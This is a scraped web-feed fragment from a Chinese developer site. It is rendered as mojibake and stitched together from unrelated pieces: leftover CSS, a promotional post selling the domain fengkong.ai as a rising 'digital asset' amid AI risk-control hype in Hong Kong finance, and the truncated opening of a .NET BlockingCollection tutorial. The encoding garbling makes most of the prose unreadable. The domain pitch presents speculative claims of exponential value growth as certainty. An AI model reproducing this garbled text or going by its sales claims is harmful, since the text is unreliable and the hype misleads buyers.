#f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ã€æ”¶è—çº§æ•°å­—èµ„äº§ Â· å³åˆ»æ‹¥æœ‰ã€‘<br/>
æˆ˜ç•¥åŸŸå fengkong.ai ç°å·²å¼€æ”¾äº¤æ˜“<br/>
ç›´è¾¾é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fciguo.net%2F" target="_blank" title="https://ciguo.net/" ref="nofollow noopener noreferrer">ciguo.net/</a><br/>
è¿™æ˜¯ä¸€ä¸ªç›´æŒ‡åƒäº¿AIé£æ§å¸‚åœºçš„å“ç‰Œå…¥å£ï¼Œä¸€ä»½å³å°†éšè¡Œä¸šçˆ†å‘è€ŒæŒ‡æ•°å¢é•¿çš„æ•°å­—ä¸åŠ¨äº§ã€‚</p>
</blockquote>
<p>å¸‚åœºé£é™©è¯„ä¼°ä¸å‡†ç¡®ã€ç¼ºä¹å®æ—¶ç›‘æ§é¢„è­¦å·²æˆä¸ºæŠ•èµ„é¢†åŸŸçš„ä¸»è¦ç—›ç‚¹ï¼Œè€Œé¦™æ¸¯é‡‘èæœºæ„é‡‡ç”¨ç”Ÿæˆå¼AIçš„æ¯”ä¾‹é«˜è¾¾38%ï¼Œè¿œè¶…å…¨çƒ26%çš„å¹³å‡æ°´å¹³ã€‚</p>
<p>æ·±å¤œçš„åŠå…¬å®¤é‡Œï¼Œä¸€å®¶é¦™æ¸¯é‡åŒ–åŸºé‡‘çš„é£æ§ä¸»ç®¡ç›¯ç€å±å¹•ä¸Šè·³åŠ¨çš„æ•°å­—ï¼Œæœ€æ–°çš„AIé¢„è­¦ç³»ç»Ÿåˆšåˆšæ ‡è®°å‡ºä¸‰ä¸ªæŠ•èµ„ç»„åˆçš„å¼‚å¸¸å…³è”äº¤æ˜“ã€‚è¿‡å»éœ€è¦äººå·¥ä¸‰å¤©å®Œæˆçš„åˆ†æï¼Œç°åœ¨åªç”¨äº†23ç§’ã€‚</p>
<p>è¿™æ˜¯AIé£æ§é¢†åŸŸæ¯å¤©å‘ç”Ÿçš„çœŸå®åœºæ™¯ï¼Œè€Œfengkong.aiè¿™ä¸ªåŸŸåï¼Œæ­£æ˜¯é€šå¾€è¿™ä¸ªä»·å€¼æ•°ä¸‡äº¿ç¾å…ƒå¸‚åœºçš„æ•°å­—é’¥åŒ™ã€‚</p>
<h2 data-id="heading-0">01 è¡Œä¸šè„‰æ</h2>
<p>é‡‘èç§‘æŠ€çš„æµªæ½®ä¸AIé£æ§çš„å¿…ç„¶å…´èµ·</p>
<p>å½“å‰å…¨çƒé‡‘èç§‘æŠ€å¸‚åœºæ­£ç»å†å‰æ‰€æœªæœ‰çš„å˜é©ï¼Œç‰¹åˆ«æ˜¯åœ¨é£é™©æ§åˆ¶é¢†åŸŸã€‚é¦™æ¸¯ä½œä¸ºå›½é™…é‡‘èä¸­å¿ƒï¼Œå¼•é¢†ç€è¿™ä¸€å˜é©çš„æ½®æµã€‚</p>
<p>æ ¹æ®ä¸€é¡¹2023å¹´çš„å…¨çƒè°ƒæŸ¥ï¼Œé¦™æ¸¯é‡‘èæœºæ„é‡‡ç”¨ç”Ÿæˆå¼AIçš„æ¯”ä¾‹å·²è¾¾åˆ°38%ï¼Œæ˜æ˜¾é«˜äºå…¨çƒ26%çš„å¹³å‡æ°´å¹³ã€‚è¿™ç§æŠ€æœ¯é‡‡çº³é€Ÿåº¦èƒŒåï¼Œåæ˜ çš„æ˜¯å¯¹é«˜æ•ˆã€ç²¾å‡†é£æ§è§£å†³æ–¹æ¡ˆçš„è¿«åˆ‡éœ€æ±‚ã€‚</p>
<p>è¡Œä¸šå†…çš„é£æ§ç—›ç‚¹ååˆ†æ˜æ˜¾ï¼šå¸‚åœºé£æ³¢å¸¦æ¥çš„ä¸å¯é¢„æµ‹å½±å“ã€é£é™©è¯„ä¼°ä¸å‡†ç¡®å¯¼è‡´æŠ•èµ„æŸå¤±ã€ç¼ºä¹å®æ—¶æ•°æ®å’Œåˆ†æé€ æˆå†³ç­–æ»åï¼Œä»¥åŠä¸å®Œå–„çš„åˆè§„ç®¡ç†å¸¦æ¥çš„æ³•å¾‹é£é™©ã€‚</p>
<p>ä¼ ç»Ÿé£æ§æ‰‹æ®µå·²æ— æ³•æ»¡è¶³ç°ä»£é‡‘èå¸‚åœºçš„éœ€æ±‚ï¼Œè€ŒAIé£æ§å‡­å€Ÿå…¶èƒ½å¤Ÿâ€œå®æ—¶åŠ¨æ€æ•°æ®ç›‘æµ‹â€ã€â€œå¤šç»´æ•°æ®åˆ†æâ€å’Œâ€œæ™ºèƒ½é¢„è­¦æç¤ºâ€çš„èƒ½åŠ›ï¼Œæ­£åœ¨æˆä¸ºé‡‘èæœºæ„çš„æ ‡é…ã€‚</p>
<h2 data-id="heading-1">02 åŸŸåè§£æ</h2>
<p>å“ç‰Œä»·å€¼ä¸å¸‚åœºå®šä½çš„æˆ˜ç•¥åŒ¹é…</p>
<p>Fengkong.aiè¿™ä¸€åŸŸåç›´æŒ‡è¡Œä¸šæ ¸å¿ƒâ€”â€œé£æ§â€ä¸â€œAIâ€çš„å®Œç¾ç»“åˆã€‚åœ¨ä¸­æ–‡è¯­å¢ƒä¸­ï¼Œâ€œé£æ§â€æ˜¯é‡‘èã€ç§‘æŠ€å’Œäº’è”ç½‘è¡Œä¸šçš„é«˜é¢‘ä¸“ä¸šæœ¯è¯­ï¼Œå…·æœ‰æ˜ç¡®çš„è¡Œä¸šæŒ‡å‘æ€§ã€‚</p>
<p>ä»å“ç‰Œå»ºè®¾è§’åº¦çœ‹ï¼Œè¿™ä¸ªåŸŸåå…·æœ‰å¤©ç„¶çš„è®°å¿†ä¼˜åŠ¿ã€‚ä¸éœ€è¦è§£é‡Šå’Œè®°å¿†çš„è™šæ„å“ç‰Œåä¸åŒï¼Œfengkong.aiç›´ç™½åœ°ä¼ è¾¾äº†ä¸šåŠ¡æ ¸å¿ƒï¼Œé™ä½äº†å®¢æˆ·è®¤çŸ¥æˆæœ¬ã€‚</p>
<p>è¿™ä¸ªåŸŸåçš„ç¨€ç¼ºæ€§ä¸è¨€è€Œå–»ã€‚åœ¨ä¼˜è´¨åŸŸåèµ„æºæ—¥ç›Šæ¯ç«­çš„ä»Šå¤©ï¼Œç®€çŸ­ã€æ˜“è®°ä¸”ä¸çƒ­é—¨è¡Œä¸šç›´æ¥ç›¸å…³çš„åŸŸåå·²æˆä¸ºæ•°å­—æ—¶ä»£çš„ç¨€æœ‰èµ„äº§ã€‚è€Œâ€œ.aiâ€åŸŸåçš„ç‰¹æ®Šæ€§æ›´å¢åŠ äº†å…¶ä»·å€¼â€”å®ƒä¸ä»…æ˜¯å®‰åœ­æ‹‰çš„å›½å®¶é¡¶çº§åŸŸåï¼Œæ›´æ˜¯äººå·¥æ™ºèƒ½è¡Œä¸šçš„èº«ä»½è±¡å¾ã€‚</p>
<h2 data-id="heading-2">03 åº”ç”¨è“å›¾</h2>
<p>AIé£æ§å¹³å°çš„å¤šå…ƒåœºæ™¯ä¸å®é™…ä»·å€¼</p>
<p>AIé£æ§æŠ€æœ¯å·²ç»æ¸—é€åˆ°é‡‘èè¡Œä¸šçš„å„ä¸ªç¯èŠ‚ã€‚ä»¥ä¸­ç§‘é—»æ­Œçš„å…¨åœºæ™¯æŠ•èµ„é£æ§å¹³å°ä¸ºä¾‹ï¼Œå®ƒèƒ½å¤Ÿå®ç°å®æ—¶åŠ¨æ€æ•°æ®ç›‘æµ‹ï¼ŒæŒç»­è¿½è¸ªä¼ä¸šçš„å…³é”®æŒ‡æ ‡å’Œé£é™©ä¿¡å·ã€‚</p>
<p>ç«¹é—´æ™ºèƒ½çš„Geminié£æ§äº§å“å±•ç¤ºäº†AIé£æ§çš„å¦ä¸€ç»´åº¦ï¼Œå®ƒèƒ½å¤Ÿæœ¬åœ°åŒ–éƒ¨ç½²ï¼Œå¿«é€Ÿé›†æˆä¸åŒæ•°æ®æºï¼Œçµæ´»å¤„ç†æµ·é‡ç»“æ„åŒ–åŠéç»“æ„åŒ–æ•°æ®ã€‚</p>
<p>è¯¥å¹³å°å®ç°äº†åŸºäºå›¾åˆ†æçš„é£æ§å¼•æ“ï¼Œåœ¨ç»“åˆä¼ ç»Ÿé£æ§è§„åˆ™çš„åŸºç¡€ä¸Šï¼Œå®ç°äº†æ·±åº¦è‡ªåŠ¨å…³è”æ¨ç†å’Œå¯ç–‘ç‚¹å‘ç°ï¼Œå¹¶è‡ªåŠ¨è¯†åˆ«æ–°çš„é£é™©æ¨¡å¼ã€‚</p>
<p>å®é™…åº”ç”¨ä¸­ï¼ŒAIé£æ§å¹³å°å¯æœåŠ¡äºå¤šä¸ªåœºæ™¯ï¼š</p>
<p>å®¢æˆ·å°½èŒè°ƒæŸ¥ï¼Œå¿«é€Ÿæä¾›å‡†ç¡®çš„ä¼ä¸šä¿¡æ¯ï¼›</p>
<p>é£é™©ç­‰çº§è¯„ä¼°ï¼Œç§‘å­¦è¯„å®šä¼ä¸šé£é™©ç­‰çº§ï¼›</p>
<p>å¤šç»´èº«ä»½è¯†åˆ«ï¼Œå…¨é¢å±•ç°ä¼ä¸šå…³è”ç½‘ç»œï¼›</p>
<p>é£é™©åŠ¨æ€ç›‘æ§ï¼ŒæŒç»­ç›‘æ§ä¼ä¸šç»è¥çŠ¶æ€å’Œé£é™©äº‹ä»¶ã€‚</p>
<h2 data-id="heading-3">04 æˆåŠŸæ ·æ¿</h2>
<p>è¡Œä¸šé¢†å…ˆè€…çš„å®è·µä¸å¸‚åœºéªŒè¯</p>
<p>åŒ—äº¬ç§‘åˆ›åŸºé‡‘çš„ä¸€ç«™å¼æ™ºèƒ½æŠ•ç ”ã€é£æ§ã€èµ„ç®¡å¹³å°æ˜¯AIé£æ§çš„æˆåŠŸæ¡ˆä¾‹ã€‚è¯¥å¹³å°åŸºäºå›¾ç¥ç»ç½‘ç»œã€æ™ºèƒ½é£é™©ç›‘æµ‹æ¨¡å‹å’Œæ™ºèƒ½æ¨èå¼•æ“æŠ€æœ¯ï¼Œèåˆäº†äº§ä¸šä»·å€¼å›¾è°±ã€‚</p>
<p>å¹³å°ä¸ºæŠ•èµ„ç ”åˆ¤ã€é£é™©ç®¡ç†å’ŒæŠ•åèµ‹èƒ½æä¾›ä¸€ç«™å¼æœåŠ¡ï¼Œå¸®åŠ©å®¢æˆ·å®ç°èµ„äº§ç®¡ç†è§„æ¨¡çš„é«˜è´¨é‡å¢é•¿ã€‚è¿™ä¸€æ¡ˆä¾‹å……åˆ†è¯æ˜äº†AIé£æ§å¹³å°çš„å®é™…ä»·å€¼å’Œå¸‚åœºæ¥å—åº¦ã€‚</p>
<p>ç«¹é—´æ™ºèƒ½çš„Geminié£æ§å¹³å°åˆ™ä½“ç°äº†æŠ€æœ¯çš„å‰æ²¿æ€§ï¼Œå®ƒçš„ â€œè®¤çŸ¥+RPAâ€æ¨¡å¼ä»…éœ€5æ­¥å°±èƒ½åˆ›å»ºä¸“å±é£æ§æœºå™¨äººï¼Œå¤§å¤§é™ä½äº†æŠ€æœ¯ä½¿ç”¨é—¨æ§›ã€‚å¹³å°åŒ…æ‹¬åˆ›å»ºã€è®­ç»ƒã€æµ‹è¯•ã€ä½¿ç”¨å’Œä¼˜åŒ–çš„å®Œæ•´æµç¨‹ï¼Œå®ç°äº†é£æ§æµç¨‹çš„è‡ªåŠ¨åŒ–å’Œæ™ºèƒ½åŒ–ã€‚</p>
<h2 data-id="heading-4">05 æˆ˜ç•¥å®šä½</h2>
<p>å›½é™…åŒ–è§†é‡ä¸å¸‚åœºæ‰©å¼ çš„åŒé‡ä¼˜åŠ¿</p>
<p>é¦™æ¸¯ä½œä¸ºå›½é™…é‡‘èä¸­å¿ƒï¼Œå…·æœ‰ç‹¬ç‰¹çš„åŒé‡ä¼˜åŠ¿ã€‚å®ƒä¸ä»…æ˜¯å†…åœ°AIä¼ä¸šå‡ºæµ·çš„æµ‹è¯•åŸºåœ°ï¼Œä¹Ÿæ˜¯å›½é™…AIæŠ€æœ¯è¿›å…¥äºšæ´²å¸‚åœºçš„é‡è¦é—¨æˆ·ã€‚</p>
<p>è¿™ç§æ¡¥æ¢ä½œç”¨åœ¨AIé£æ§é¢†åŸŸå°¤ä¸ºé‡è¦ã€‚é¦™æ¸¯æ‹¥æœ‰å›½é™…åŒ–çš„å®¢æˆ·åŸºç¡€å’Œç¯å¢ƒï¼Œä½¿å…¶æˆä¸ºAIå…¬å¸æœåŠ¡å…¨çƒå¸‚åœºçš„ç†æƒ³è¯•ç‚¹ã€‚</p>
<p>å¯¹äºæ‹¥æœ‰fengkong.aiåŸŸåçš„ä¼ä¸šï¼Œè¿™ä¸€æˆ˜ç•¥ä½ç½®æä¾›äº†åŒé‡æœºé‡ï¼šæ—¢å¯ä»¥æœåŠ¡å†…åœ°åºå¤§çš„é‡‘èå¸‚åœºï¼Œåˆèƒ½å¯¹æ¥å›½é™…å…ˆè¿›çš„AIæŠ€æœ¯å’Œé‡‘èæ ‡å‡†ã€‚</p>
<p>é¦™æ¸¯ä¸‰æ‰€å¤§å­¦â€”é¦™æ¸¯ç§‘æŠ€å¤§å­¦ã€é¦™æ¸¯å¤§å­¦å’Œé¦™æ¸¯ä¸­æ–‡å¤§å­¦åœ¨2025å¹´QSä¸–ç•Œå¤§å­¦æ’åä¸­ï¼Œå‡è¿›å…¥äº†æ•°æ®ç§‘å­¦å’ŒAIé¢†åŸŸçš„å‰20åã€‚è¿™ä¸ºAIé£æ§é¢†åŸŸæä¾›äº†ä¸°å¯Œçš„äººæ‰èµ„æºå’Œç ”å‘æ”¯æŒã€‚</p>
<h2 data-id="heading-5">06 æŠ•èµ„å‰ç»</h2>
<p>æ•°å­—èµ„äº§å¢å€¼ä¸å“ç‰Œå»ºè®¾çš„åŒé‡å›æŠ¥</p>
<p>ä»æŠ•èµ„è§’åº¦çœ‹ï¼Œfengkong.aiè¿™æ ·çš„è¡Œä¸šç²¾å‡†åŸŸåå…·æœ‰å¤šé‡ä»·å€¼ç»´åº¦ã€‚åœ¨AIé£æ§è¡Œä¸šçˆ†å‘å‰å¤œï¼ŒæŠ¢å è¿™ä¸€æˆ˜ç•¥åŸŸåç›¸å½“äºåœ¨æ•°å­—ä¸–ç•Œåœˆå®šäº†è¡Œä¸šé¢†åœ°ã€‚</p>
<p>åŸŸåçš„ä»·å€¼ä¼šéšç€AIé£æ§è¡Œä¸šçš„å‘å±•è€Œè‡ªç„¶å¢å€¼ï¼Œè¿™ç§å¢å€¼æ˜¯æŒ‡æ•°çº§çš„ã€‚å½“AIé£æ§æˆä¸ºé‡‘èè¡Œä¸šçš„æ ‡å‡†é…ç½®æ—¶ï¼Œè¿™ä¸ªåŸŸåçš„å“ç‰Œä»·å€¼å°†ä¸å¯ä¼°é‡ã€‚</p>
<p>åŸŸåæŠ•èµ„ä¸å…¶ä»–æŠ•èµ„ä¸åŒï¼Œå®ƒå…·æœ‰â€œèµ¢å®¶é€šåƒâ€çš„ç‰¹ç‚¹ã€‚åœ¨äº’è”ç½‘é¢†åŸŸï¼Œè¡Œä¸šå…³é”®è¯åŸŸåå¾€å¾€åªæ‰¿è®¤ä¸€ä¸ªæƒå¨æŒæœ‰è€…ã€‚è¿™æ„å‘³ç€ä¸€æ—¦ä½ æ‹¥æœ‰äº†fengkong.aiï¼Œå°±ç›¸å½“äºåœ¨è¿™ä¸ªç»†åˆ†é¢†åŸŸå»ºç«‹äº†å¤©ç„¶çš„ç«äº‰å£å’ã€‚</p>
<p>é¦™æ¸¯å›½é™…æœºåœºç¬¬ä¸‰è·‘é“ç³»ç»Ÿå·²å…¨é¢å¯ç”¨ï¼Œå¹´æ—…å®¢ååé‡å¢è‡³1.2äº¿äººæ¬¡ã€‚æ¯å¤©ï¼Œæ— æ•°èµ„é‡‘ã€æ•°æ®å’Œå†³ç­–åœ¨è¿™é‡Œäº¤æ±‡æµè½¬ã€‚</p>
<p>è·‘é“ä¸Šï¼ŒFJDynamicså…¬å¸çš„è‡ªä¸»åˆ’çº¿æœºå™¨äººç²¾ç¡®åœ°æ ‡è®°ç€å®‰å…¨çº¿ï¼Œè¯¯å·®ä¸è¶…è¿‡2å˜ç±³ã€‚ä¸æ­¤åŒæ—¶ï¼Œé‡‘èå¸‚åœºçš„â€œè·‘é“â€ä¸Šï¼ŒAIé£æ§ç³»ç»Ÿæ­£ä»¥æ›´é«˜çš„ç²¾åº¦æ ‡è®°ç€é£é™©è¾¹ç•Œã€‚</p>
<p><strong>ç°åœ¨ï¼Œæ‚¨æœ‰æœºä¼šé€šè¿‡Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fciguo.net%2F" target="_blank" title="https://ciguo.net/" ref="nofollow noopener noreferrer">ciguo.net/</a>Â ç›´æ¥æŒæœ‰Â <a href="https://link.juejin.cn?target=https%3A%2F%2Ffengkong.ai%2F" target="_blank" title="https://fengkong.ai/" ref="nofollow noopener noreferrer">fengkong.ai</a>Â è¿™ä¸€æˆ˜ç•¥åŸŸåï¼Œæˆä¸ºAIé£æ§èµ›é“æ•°å­—åœ°æ ‡çš„æ‹¥æœ‰è€…ã€‚è¿™ä¸ä»…æ˜¯ä¸€æ¬¡è´­ä¹°ï¼Œæ›´æ˜¯å¯¹é‡‘èç§‘æŠ€æœªæ¥çš„æå‰å¸ƒå±€ã€‚</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[BlockingCollection<T> å†…éƒ¨æœºåˆ¶ä¸æœ€ä½³å®è·µ]]></title>    <link>https://juejin.cn/post/7596971669862088745</link>    <guid>https://juejin.cn/post/7596971669862088745</guid>    <pubDate>2026-01-19T23:19:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596971669862088745" data-draft-id="7596969908324499510" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="BlockingCollection&lt;T&gt; å†…éƒ¨æœºåˆ¶ä¸æœ€ä½³å®è·µ"/> <meta itemprop="keywords" content="C#,.NET"/> <meta itemprop="datePublished" content="2026-01-19T23:19:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å”é’æ«"/> <meta itemprop="url" content="https://juejin.cn/user/3737995266234280"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            BlockingCollection&lt;T&gt; å†…éƒ¨æœºåˆ¶ä¸æœ€ä½³å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3737995266234280/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å”é’æ«
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T23:19:23.000Z" title="Mon Jan 19 2026 23:19:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ç®€ä»‹</h3>
<p><code>BlockingCollection&lt;T&gt;</code> æ˜¯ <code>.NET</code> ä¸­éå¸¸é‡è¦ä¸”å®ç”¨çš„çº¿ç¨‹å®‰å…¨ã€é˜»å¡å¼çš„ç”Ÿäº§è€…-æ¶ˆè´¹è€…é›†åˆç±»ï¼Œä½äº <code>System.Collections.Concurrent</code> å‘½åç©ºé—´ã€‚</p>
<blockquote>
<p>BlockingCollection ä¸æ˜¯é˜Ÿåˆ—ï¼Œ
è€Œæ˜¯ä¸€ä¸ªâ€œå¸¦é˜»å¡è¯­ä¹‰çš„å¹¶å‘ç®¡é“ï¼ˆBlocking Producerâ€“Consumer Abstractionï¼‰â€ã€‚
åœ¨å¹¶å‘é›†åˆå¤–é¢ï¼ŒåŠ äº†ä¸€å±‚â€œé˜»å¡ + å®¹é‡æ§åˆ¶ + å®Œæˆè¯­ä¹‰â€</p>
</blockquote>
<h3 data-id="heading-1">ä»€ä¹ˆæ˜¯ç”Ÿäº§è€…-æ¶ˆè´¹è€…æ¨¡å¼ï¼Ÿ</h3>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// ç”Ÿäº§è€…çº¿ç¨‹ â†’ [BlockingCollection] â†’ æ¶ˆè´¹è€…çº¿ç¨‹</span>
<span class="hljs-comment">// 1. ç”Ÿäº§è€…æ·»åŠ é¡¹ç›®ï¼Œå¦‚æœé›†åˆå·²æ»¡åˆ™é˜»å¡ç­‰å¾…</span>
<span class="hljs-comment">// 2. æ¶ˆè´¹è€…å–å‡ºé¡¹ç›®ï¼Œå¦‚æœé›†åˆä¸ºç©ºåˆ™é˜»å¡ç­‰å¾…</span>
<span class="hljs-comment">// 3. è‡ªåŠ¨çš„çº¿ç¨‹åŒæ­¥å’Œèµ„æºç®¡ç†</span>
</code></pre>
<h3 data-id="heading-2">æ ¸å¿ƒå®šä½ä¸ä»·å€¼</h3>
<p><code>BlockingCollection&lt;T&gt;</code> æ˜¯ä¸€ä¸ªåŒ…è£…å™¨ï¼Œå®ƒå¯ä»¥åŸºäºä»¥ä¸‹å‡ ç§åº•å±‚é›†åˆæ¥å·¥ä½œï¼ˆé»˜è®¤ä½¿ç”¨ <code>ConcurrentQueue&lt;T&gt;</code>ï¼‰ï¼š</p>



































